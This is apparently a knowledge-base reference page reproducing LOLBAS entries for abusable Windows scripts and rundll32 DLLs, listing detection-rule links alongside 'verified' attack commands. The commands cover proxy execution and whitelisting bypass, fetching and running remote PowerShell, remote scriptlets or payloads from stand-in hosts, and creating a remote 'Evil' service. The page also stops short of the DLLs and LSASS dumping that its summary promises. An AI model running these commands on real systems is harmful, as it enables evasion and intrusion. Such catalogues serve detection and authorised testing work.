---
title: lolbins_os_scripts_and_libraries
category: reasoning
engine: team_strategy_arbiter
team_role: lolbins
os_platform: windows
domain_hub: "[[reasoning/LOLBINS]]"
primary_tactic: Defense_Evasion_Firewall
summary: "LOLBINS Windows Native OS Scripts (10 LOLScripts), OS Libraries (16 LOLLibs / DLLs) & Honorable Mentions (2): Complete reference from https://github.com/CROWInnovations/LOLBAS covering CL_Invocation.ps1, CL_LoadAssembly.ps1, CL_mutexverifiers.ps1, Launch-VsDevShell.ps1, Manage-bde.wsf, Pester.bat, Pubprn.vbs, Syncappvpublishingserver.vbs, UtilityFunctions.ps1, Winrm.vbs, and DLL libraries Advpack.dll, Comsvcs.dll (MiniDump LSASS), Desk.cpl, Dfshim.dll, Ieadvpack.dll, Ieframe.dll, Mshtml.dll, Pcwutl.dll, Scrobj.dll, Setupapi.dll, Shdocvw.dll, Shell32.dll, Shimgvw.dll, Syssetup.dll, Url.dll, Zipfldr.dll."
when_to_apply: "Apply when executing, auditing, or hunting Windows Living Off The Land scripts (LOLScripts: Pubprn.vbs, Winrm.vbs, Manage-bde.wsf, Syncappvpublishingserver.vbs, CL_Invocation.ps1, CL_LoadAssembly.ps1, Pester.bat) or rundll32-invoked OS DLL libraries (LOLLibs: comsvcs.dll MiniDump LSASS credential dumping, advpack.dll, ieframe.dll, mshtml.dll, pcwutl.dll, scrobj.dll, setupapi.dll, shell32.dll, url.dll, zipfldr.dll)."
tags: [reasoning, lolbins, lolbas, lolscripts, lollibs, windows, living-off-the-land, comsvcs, lsass, minidump, pubprn, winrm, manage-bde, pester, advpack, scrobj, shell32, url-dll, zipfldr, mshtml, ieframe, red-team, hunt-team, blue-team]
updated: 2026-11-01 01:10:00
---
# LOLBINS — Windows Native OS Scripts (`LOLScripts`), OS Libraries (`LOLLibs`) & Honorable Mentions

> **Parent Section Hub:** [[reasoning/LOLBINS]]  
> **Official Repository:** [`https://github.com/CROWInnovations/LOLBAS/tree/master/yml`](https://github.com/CROWInnovations/LOLBAS/tree/master/yml)  
> **Sibling Playbooks:** [[reasoning/LOLBINS/lolbins_os_binaries_a_to_l]] | [[reasoning/LOLBINS/lolbins_os_binaries_m_to_z]] | [[reasoning/LOLBINS/lolbins_other_ms_binaries]] | [[reasoning/LOLBINS/lolbins_tactical_categories_and_detections]]  
> **Backlinks:** [[00_MEMORY_INDEX]] | [[commands/windows_master_command_playbook]] | [[reasoning/red_team_strategy_playbook]] | [[reasoning/hunt_team_strategy_playbook]] | [[reasoning/blue_team_strategy_playbook]]

---

## 1. Windows Native OS Scripts (`yml/OSScripts` — 10 LOLScripts)

### `CL_LoadAssembly.ps1` (`yml/OSScripts/CL_LoadAssembly.yml`)
- **Description:** PowerShell Diagnostic Script
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/CL_LoadAssembly.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/CL_LoadAssembly.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/CL_LoadAssembly.yml`
- **Default Windows Paths:** `C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/ff6c54ded6b52f379cec11fe17c1ccb956faa660/rules/windows/process_creation/proc_creation_win_lolbas_cl_loadassembly.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"` | Execute proxied payload with Microsoft signed binary |

### `CL_Mutexverifiers.ps1` (`yml/OSScripts/CL_mutexverifiers.yml`)
- **Description:** Proxy execution with CL_Mutexverifiers.ps1
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/CL_mutexverifiers.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/CL_mutexverifiers.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/CL_mutexverifiers.yml`
- **Default Windows Paths:** `C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1`, `C:\Windows\diagnostics\system\Audio\CL_Mutexverifiers.ps1`, `C:\Windows\diagnostics\system\WindowsUpdate\CL_Mutexverifiers.ps1`, `C:\Windows\diagnostics\system\Video\CL_Mutexverifiers.ps1` (+1 more)
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_cl_mutexverifiers.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `. C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess calc.ps1` | Proxy execution |

### `CL_Invocation.ps1` (`yml/OSScripts/Cl_invocation.yml`)
- **Description:** Aero diagnostics script
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/Cl_invocation.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/Cl_invocation.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/Cl_invocation.yml`
- **Default Windows Paths:** `C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1`, `C:\Windows\diagnostics\system\Audio\CL_Invocation.ps1`, `C:\Windows\diagnostics\system\WindowsUpdate\CL_Invocation.ps1`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_cl_invocation.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_cl_invocation_lolscript.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke <executable> [args]` | Proxy execution |

### `Launch-VsDevShell.ps1` (`yml/OSScripts/Launch-VsDevShell.yml`)
- **Description:** Locates and imports a Developer PowerShell module and calls the Enter-VsDevShell cmdlet
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/Launch-VsDevShell.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/Launch-VsDevShell.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/Launch-VsDevShell.yml`
- **Default Windows Paths:** `C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\Tools\Launch-VsDevShell.ps1`, `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\Launch-VsDevShell.ps1`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_launch_vsdevshell.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath "C:\windows\system32\calc.exe"` | Proxy execution |
| **Execute** | `T1216` | `User` | `powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; calc.exe ;"` | Proxy execution |

### `Manage-bde.wsf` (`yml/OSScripts/Manage-bde.yml`)
- **Description:** Script for managing BitLocker
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/Manage-bde.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/Manage-bde.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/Manage-bde.yml`
- **Default Windows Paths:** `C:\Windows\System32\manage-bde.wsf`
- **Key Forensic / Hunt IOCs:** `Manage-bde.wsf should not be invoked by a standard user under normal situations`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_manage_bde.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf` | Proxy execution from script |
| **Execute** | `T1216` | `User` | `copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf` | Proxy execution from script |

### `Pubprn.vbs` (`yml/OSScripts/Pubprn.yml`)
- **Description:** Proxy execution with Pubprn.vbs
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/Pubprn.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/Pubprn.yml`
- **Default Windows Paths:** `C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs`, `C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs`
- **Detection Rules:** [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), [Sigma](https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216.001` | `User` | `pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct` | Proxy execution |

### `Syncappvpublishingserver.vbs` (`yml/OSScripts/Syncappvpublishingserver.yml`)
- **Description:** Script used related to app-v and publishing server
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/Syncappvpublishingserver.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/Syncappvpublishingserver.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/Syncappvpublishingserver.yml`
- **Default Windows Paths:** `C:\Windows\System32\SyncAppvPublishingServer.vbs`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216.002` | `User` | `SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') \| IEX"` | Use Powershell host invoked from vbs script |

### `UtilityFunctions.ps1` (`yml/OSScripts/UtilityFunctions.yml`)
- **Description:** PowerShell Diagnostic Script
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/UtilityFunctions.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/UtilityFunctions.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/UtilityFunctions.yml`
- **Default Windows Paths:** `C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/0.21-688-gd172b136b/rules/windows/process_creation/proc_creation_win_lolbas_utilityfunctions.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"` | Execute proxied payload with Microsoft signed binary |

### `winrm.vbs` (`yml/OSScripts/Winrm.yml`)
- **Description:** Script used for manage Windows RM settings
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/Winrm.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/Winrm.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/Winrm.yml`
- **Default Windows Paths:** `C:\Windows\System32\winrm.vbs`, `C:\Windows\SysWOW64\winrm.vbs`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_awl_bypass.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_winrm_awl_bypass.yml), [BlockRule](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985` | Proxy execution |
| **Execute** | `T1216` | `Admin` | `winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985` | Proxy execution |
| **AWL Bypass** | `T1220` | `User` | `%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty` | Execute arbitrary, unsigned code via XSL script |

### `Pester.bat` (`yml/OSScripts/pester.yml`)
- **Description:** Used as part of the Powershell pester
- **CROW Innovations LOLBAS Source:** [`yml/OSScripts/pester.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSScripts/pester.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSScripts/pester.yml`
- **Default Windows Paths:** `c:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat`, `c:\Program Files\WindowsPowerShell\Modules\Pester\*\bin\Pester.bat`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_pester_1.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1216` | `User` | `Pester.bat [/help\|?\|-?\|/?] "$null; notepad"` | Proxy execution |
| **Execute** | `T1216` | `User` | `Pester.bat ;calc.exe` | Proxy execution |
| **Execute** | `T1216` | `User` | `Pester.bat ;calc.exe` | Proxy execution |


---

## 2. Windows Native OS Libraries / DLLs (`yml/OSLibraries` — 16 LOLLibs)

### `Advpack.dll` (`yml/OSLibraries/Advpack.yml`)
- **Description:** Utility for installing software and drivers with rundll32.exe
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Advpack.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Advpack.yml`
- **Default Windows Paths:** `c:\windows\system32\advpack.dll`, `c:\windows\syswow64\advpack.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.011` | `User` | `rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,` | Run local or remote script(let) code through INF file specification. |
| **AWL Bypass** | `T1218.011` | `User` | `rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,,1,` | Run local or remote script(let) code through INF file specification. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe advpack.dll,RegisterOCX test.dll` | Load a DLL payload. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe advpack.dll,RegisterOCX calc.exe` | Run an executable payload. |
| **Execute** | `T1218.011` | `User` | `rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"` | Run an executable payload. |

### `Desk.cpl` (`yml/OSLibraries/Desk.yml`)
- **Description:** Desktop Settings Control Panel
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Desk.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Desk.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Desk.yml`
- **Default Windows Paths:** `C:\Windows\System32\desk.cpl`, `C:\Windows\SysWOW64\desk.cpl`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/file/file_event/file_event_win_new_src_file.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe desk.cpl,InstallScreenSaver C:\temp\file.scr` | Launch any executable payload, as long as it uses the .scr extension. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe desk.cpl,InstallScreenSaver \\127.0.0.1\c$\temp\file.scr` | Launch any executable payload, as long as it uses the .scr extension. |

### `Dfshim.dll` (`yml/OSLibraries/Dfshim.yml`)
- **Description:** ClickOnce engine in Windows used by .NET
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Dfshim.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Dfshim.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Dfshim.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe`, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1127` | `User` | `rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo` | Use binary to bypass Application whitelisting |

### `Ieadvpack.dll` (`yml/OSLibraries/Ieadvpack.yml`)
- **Description:** INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Ieadvpack.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Ieadvpack.yml`
- **Default Windows Paths:** `c:\windows\system32\ieadvpack.dll`, `c:\windows\syswow64\ieadvpack.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,` | Run local or remote script(let) code through INF file specification. |
| **AWL Bypass** | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,LaunchINFSection c:\test.inf,,1,` | Run local or remote script(let) code through INF file specification. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,RegisterOCX test.dll` | Load a DLL payload. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe ieadvpack.dll,RegisterOCX calc.exe` | Run an executable payload. |
| **Execute** | `T1218.011` | `User` | `rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"` | Run an executable payload. |

### `Ieframe.dll` (`yml/OSLibraries/Ieframe.yml`)
- **Description:** Internet Browser DLL for translating HTML code.
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Ieframe.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Ieframe.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Ieframe.yml`
- **Default Windows Paths:** `c:\windows\system32\ieframe.dll`, `c:\windows\syswow64\ieframe.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"` | Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed. |

### `Mshtml.dll` (`yml/OSLibraries/Mshtml.yml`)
- **Description:** Microsoft HTML Viewer
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Mshtml.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Mshtml.yml`
- **Default Windows Paths:** `c:\windows\system32\mshtml.dll`, `c:\windows\syswow64\mshtml.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe Mshtml.dll,PrintHTML "C:\temp\calc.hta"` | Launch an HTA application. |

### `Pcwutl.dll` (`yml/OSLibraries/Pcwutl.yml`)
- **Description:** Microsoft HTML Viewer
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Pcwutl.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Pcwutl.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Pcwutl.yml`
- **Default Windows Paths:** `c:\windows\system32\pcwutl.dll`, `c:\windows\syswow64\pcwutl.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe pcwutl.dll,LaunchApplication calc.exe` | Launch an executable. |

### `Scrobj.dll` (`yml/OSLibraries/Scrobj.yml`)
- **Description:** Windows Script Component Runtime
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Scrobj.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Scrobj.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Scrobj.yml`
- **Default Windows Paths:** `c:\windows\system32\scrobj.dll`, `c:\windows\syswow64\scrobj.dll`
- **Key Forensic / Hunt IOCs:** `Execution of rundll32.exe with 'GenerateTypeLib' and a protocol handler ('://') on the command line`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib http://x.x.x.x/payload.exe` | Download file from remote location. |

### `Setupapi.dll` (`yml/OSLibraries/Setupapi.yml`)
- **Description:** Windows Setup Application Programming Interface
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Setupapi.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Setupapi.yml`
- **Default Windows Paths:** `c:\windows\system32\setupapi.dll`, `c:\windows\syswow64\setupapi.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_rundll32_setupapi_installhinfsection.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___setupapi.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.011` | `User` | `rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\shady.inf` | Run local or remote script(let) code through INF file specification. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\Tools\calc_exe.inf` | Load an executable payload. |

### `Shdocvw.dll` (`yml/OSLibraries/Shdocvw.yml`)
- **Description:** Shell Doc Object and Control Library.
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Shdocvw.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Shdocvw.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Shdocvw.yml`
- **Default Windows Paths:** `c:\windows\system32\shdocvw.dll`, `c:\windows\syswow64\shdocvw.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"` | Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed. |

### `Shell32.dll` (`yml/OSLibraries/Shell32.yml`)
- **Description:** Windows Shell Common Dll
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Shell32.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Shell32.yml`
- **Default Windows Paths:** `c:\windows\system32\shell32.dll`, `c:\windows\syswow64\shell32.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml), [Splunk](https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/rundll32_control_rundll_hunt.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe shell32.dll,Control_RunDLL c:\path\to\payload.dll` | Load a DLL payload. |
